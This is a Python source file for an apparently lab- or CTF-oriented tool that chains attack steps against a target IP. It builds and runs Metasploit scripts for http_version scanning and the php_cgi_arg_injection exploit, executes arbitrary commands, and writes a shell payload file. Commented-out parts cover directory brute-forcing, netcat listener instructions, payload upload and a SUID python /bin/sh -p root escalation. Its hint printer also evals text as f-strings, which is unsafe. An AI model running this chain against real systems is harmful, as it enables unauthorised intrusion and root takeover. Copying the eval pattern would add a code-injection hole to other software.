from inspect import Parameter
import os
import getpass
from matplotlib.pyplot import hist
from numpy import mat
from packaging import version
from subprocess import Popen, PIPE
import re
from termios import tcflush, TCIFLUSH
import sys

Default = False

def concatenate_cmd(args):
    cmd = ""
    for e in args:
        cmd += e + " "
    return cmd

def get_output_data(Data, block_Out):
    for para in block_Out:
        try: # if Data doesn't contain para, we give it as None
            Data[para]
        except KeyError:
            Data[para] = None
        if Data[para] == None:
            user_input = input("please find value of \"{para}\" in above output, and enter it (true/false):".format(para=para))
            if user_input != '':
                if user_input.lower()[0] == 't':
                    Data[para] = True
                elif user_input.lower()[0] == 'f' :
                    Data[para] = False
                else:
                    Data[para] = user_input
    # print("update data:", Data)
    return Data

def check_output_data(Data, block_Out):
    match = True
    for para in block_Out:
        if Data[para] == None:
            match = False
    return match

def give_hint(hints, args, func_in, Data):
    # flush input buffer, in case there are any unexpected user input before that affect input()
    tcflush(sys.stdin, TCIFLUSH)
    # user_input = input('press Enter to continue...\n')
    cmd = concatenate_cmd(args)
    if hints!=None:
        for hint in hints:
            if ("<cmd>") in hint:
                hint =  hint.replace("<cmd>", cmd)
            for data in Data:
                if ("<" + str(data) + ">") in hint:
                    hint = hint.replace("<" + data + ">", str(Data[data]))
            if ("+FORMAT+") in hint:
                hint =  hint.replace("+FORMAT+", "")
                print(eval("f'{}'".format(hint)))
            else:
            	print(hint)
            user_input = input('press Enter to continue...\n')

class Function():
    def http_version(func_in, Data, args, block_In, block_Out, block_hint):
        # - msfconsole
        # - wait for 15s (msfconsole opening)
        # - use auxiliary/scanner/http/http_version
        # - set RHOSTS {IP}
        # - run
        # - (assume get Apache/2.4.6)

        configFile=open('meta.rc','w')
        configFile.write('use auxiliary/scanner/http/http_version\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                # print(Data['Apache'])
                # problem 1:This way, however, isn't import condition from block!!!
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True

            print(outputLine)     
        
        match = check_output_data(Data, block_Out)
        return Data, match

    def php_cgi_arg_injection(func_in, Data, args, block_In, block_Out, block_hint):
        # use exploit/multi/http/php_cgi_arg_injection
        # - set RHOSTS {IP}
        # - run
        configFile=open('meta.rc','w')
        configFile.write('use exploit/multi/http/php_cgi_arg_injection\n')
        configFile.write(f"set RHOST {func_in['IP']}\n")
        configFile.write('run\n')
        configFile.write('exit\n')
        configFile.close()
        proc = Popen(['msfconsole', '-r', 'meta.rc'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''): 
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True
            print(outputLine)        
        match = check_output_data(Data, block_Out)
        return Data, match

    def metasploit(func_in, Data, args, block_In, block_Out, block_hint):
        script_name = ""
        for arg in args:
            if ".rc" in arg:
                script_name = arg
                break
        # start with a template script
        templateFile=open("./meta_script_template/" + script_name,'r')
        configFile=open(script_name,'w')
        for line in templateFile:
            subst_line = line
            if '<' in line and '>' in line:
                l = line.find('<')
                r = line.find('>')
                param = line[l+1:r]
                subst_line = line.replace("<" + param + ">",Data[param])
            configFile.write(subst_line + "\n")
        templateFile.close()
        configFile.close()
        # run the script
        proc = Popen(['msfconsole'] + args, stdout=PIPE)

        # grab needed info from script
        for stdout_line in iter(proc.stdout.readline, b''): 
            
            outputLine = stdout_line.decode('utf-8').rstrip()
            
            # code below just for getting apache version
            if "Apache/" in outputLine:
                From = outputLine.find('Apache/')+len('Apache/')
                Data['Apache'] = outputLine[From:From+10].split(' ')[0]
                if version.parse(Data['Apache']) < version.parse('3.1'):
                    match = True
            
            if re.search("session [0-9] opend", outputLine)!=None:
                match = True

            print(outputLine)  

        match = check_output_data(Data, block_Out)
        return Data, match 
        
    def print_something(func_in, Data, args, block_In, block_Out, block_hint):
        print("class chain is running~~")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def gobuster(func_in, Data, args, block_In, block_Out, block_hint):
        proc = Popen(['gobuster', 'dir', '-u', func_in['IP'], '-w', '/usr/share/wordlists/dirb/common.txt'], stdout=PIPE)
        for stdout_line in iter(proc.stdout.readline, b''):
            # code below just for getting apache version
            outputLine = stdout_line.decode('utf-8').rstrip()
            print(outputLine)
            if re.search("/panel", outputLine)!=None:
                match = True
                return Data, match
        # os.system(f"gobuster dir -u {func_in['IP']} -w /usr/share/wordlists/dirb/common.txt")
        match = check_output_data(Data, block_Out)
        # return Data, match

    def netcat(func_in, Data, args, block_In, block_Out, block_hint):
        cmd = ""
        for e in args:
            cmd += e + " "
        print(f'\nPlease open another terminal and enter `nc {cmd}{func_in["port"]}`.')
        result = input("After done, press enter to move on next step.\n")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def create_file(func_in, Data, args, block_In, block_Out, block_hint):
        try:
            with open(f'/home/{getpass.getuser()}/Desktop/{args[1]}', 'w') as f:
                file = args[0]
                # for i in range(len(args)):
                    # file = file.replace("REPLACE_IT_IP", Data[block_In[i]])
                for i in block_In:
                    file = file.replace(f"REPLACE_IT_{i}", Data[i])
                f.write(file)
        except FileNotFoundError:
            print(f'Fail to create a file on path:/home/{getpass.getuser()}/Desktop/')
        # print(f"\nGo to /home/{getpass.getuser()}/Desktop/, you would find {args[1]}.")
        # print(f"Upload it to the {Data['IP']}/"+"{"+"existing page you found"+"}."+f" ex: {Data['IP']}/panel")
        # print(f"Go to the {Data['IP']}/uploads page, click the file to execute (Make sure you listening to the port first).\n")
        # result = input("After you get shell, press enter to move on next step.\n")
        give_hint(block_hint, args, func_in, Data)
        match = check_output_data(Data, block_Out)
        return Data, match

    '''
    def get_root(func_in, Data, args, block_In, block_Out, block_hint):
        print('\nPlease enter `find / -user root -perm -4000 -exec ls -ldb {} \; | grep root` in shell you got.')
        result = input("If you see python has root permission, enter yes, else enter no.\n")
        if result != "no":
            print('\nEnter `python -c \'import os; os.execl("/bin/sh", "sh", "-p")\'` in shell, and you will be root.\n')
        else:
            print("\nSorry we can't help :(\n")
        match = check_output_data(Data, block_Out)
        return Data, match
    '''
    def magic_function(func_in, Data, args, block_In, block_Out, block_hint):
        flag = False
        print("data: ", Data)
        for i in range(len(args)):
            if flag == True:
                break
            else:
                for input_token in func_in:
                    if ("<" + input_token + ">") in args[i]:
                        if Data[input_token] == None:
                            #TO DO: add user input to explore.Data, connect to user_takeover if possible
                            print('There are some missing data. ' + input_token + ' cannot be empty!')
                            mode = input("Please choose next step. 1 for user take over, 2 for running other class methods.\nNext step: ")
                            if mode == '1':
                                u_in = input("input " + input_token + ": ")
                                args[i] =  args[i].replace("<" + input_token + ">", u_in)
                            elif mode == '2':
                                flag = True
                                break
                            else:
                                flag = True
                                break
                        else:
                            args[i] =  args[i].replace("<" + input_token + ">", Data[input_token])
        if flag == False:
            if args!=None and args!=[]:
                if  args[0]!='NOEXE' :
                    print("in magic_function excute:", concatenate_cmd(args))
                    proc = Popen(args, stdout=PIPE)
                    temp = open('temp.txt', 'w')
                    temp.truncate(0)
                    for stdout_line in iter(proc.stdout.readline, b''):
                        print("{}".format(stdout_line.decode('utf-8')).rstrip()) 
                        temp.write("{}\n".format(stdout_line.decode('utf-8')).rstrip())
                else:
                    args.remove('NOEXE')
            give_hint(block_hint, args, func_in, Data)
        Data = get_output_data(Data, block_Out)
        match = check_output_data(Data, block_Out)
        return Data, match
